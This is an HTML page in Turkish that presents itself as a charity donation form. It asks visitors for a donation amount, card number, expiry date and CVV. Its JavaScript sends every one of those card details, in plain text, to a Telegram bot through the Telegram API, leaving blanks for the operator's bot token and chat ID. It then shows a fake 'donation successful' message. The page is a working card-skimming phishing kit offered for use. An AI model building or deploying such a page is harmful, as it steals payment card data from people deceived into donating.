<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bağış Yap</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            background: linear-gradient(to top, #ff66b2, #ff3385);
        }

        .donation-form {
            background: #fff;
            padding: 30px;
            border-radius: 10px;
            width: 400px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            text-align: center;
            position: relative;
            background: linear-gradient(45deg, #ff66b2, #9b4bdb, #ff3385);
            background-size: 400% 400%;
            animation: gradientAnimation 10s ease infinite;
        }

        @keyframes gradientAnimation {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        h2 {
            color: #fff;
            margin-bottom: 20px;
        }

        label {
            font-size: 16px;
            color: #333;
            margin-bottom: 8px;
            display: block;
        }

        select, input {
            width: 100%;
            padding: 12px;
            margin-bottom: 20px;
            border: 2px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }

        input[type="number"]:focus, input[type="text"]:focus {
            border-color: #ff66b2;
        }

        .submit-btn {
            background-color: #ff66b2;
            color: white;
            border: none;
            padding: 15px;
            width: 100%;
            font-size: 18px;
            border-radius: 5px;
            cursor: pointer;
        }

        .submit-btn:hover {
            background-color: #ff3385;
        }

        #custom-amount {
            display: none;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>

    <div class="donation-form">
        <h2>Bağış Yap</h2>

        <form id="donation-form">
            <label for="amount">Bağış Tutarı Seçin:</label>
            <select id="amount" name="amount">
                <option value="100">100 TL</option>
                <option value="200">200 TL</option>
                <option value="400">400 TL</option>
                <option value="custom">İstediğiniz Tutarı Giriniz</option>
            </select>
            <input type="number" id="custom-amount" name="custom-amount" placeholder="Tutar Giriniz" style="display:none;" required>

            <label for="card-number">Kart Numarası:</label>
            <input type="text" id="card-number" name="card-number" placeholder="Kart Numarası" required>

            <label for="expiry">Son Kullanma Tarihi (Ay/Yıl):</label>
            <input type="text" id="expiry" name="expiry" placeholder="Ay/Yıl (MM/YYYY)" required>

            <label for="cvv">CVV:</label>
            <input type="text" id="cvv" name="cvv" placeholder="CVV" required>

            <button type="submit" class="submit-btn">Bağış Yap</button>
        </form>
    </div>

    <script>
        document.getElementById("amount").addEventListener("change", function() {
            if (this.value === "custom") {
                document.getElementById("custom-amount").style.display = "block";
            } else {
                document.getElementById("custom-amount").style.display = "none";
            }
        });

        document.getElementById('donation-form').addEventListener('submit', function(event) {
            event.preventDefault();

            const amount = document.getElementById('amount').value;
            const customAmount = document.getElementById('custom-amount').value;
            const cardNumber = document.getElementById('card-number').value;
            const expiry = document.getElementById('expiry').value;
            const cvv = document.getElementById('cvv').value;

            const finalAmount = amount === 'custom' ? customAmount : amount;

            const message = `Bağış Yapıldı!\nTutar: ${finalAmount} TL\nKart Numarası: ${cardNumber}\nSon Kullanma Tarihi: ${expiry}\nCVV: ${cvv}`;

            const chatId = ' ';  // Telegram kullanıcı ID'niz
            const botToken = ' ';  // Telegram bot token'ınız
            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            fetch(apiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    alert('Bağış işlemi başarılı!');
                } else {
                    alert('Bir hata oluştu.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Bir hata oluştu.');
            });
        });
    </script>

</body>
</html>
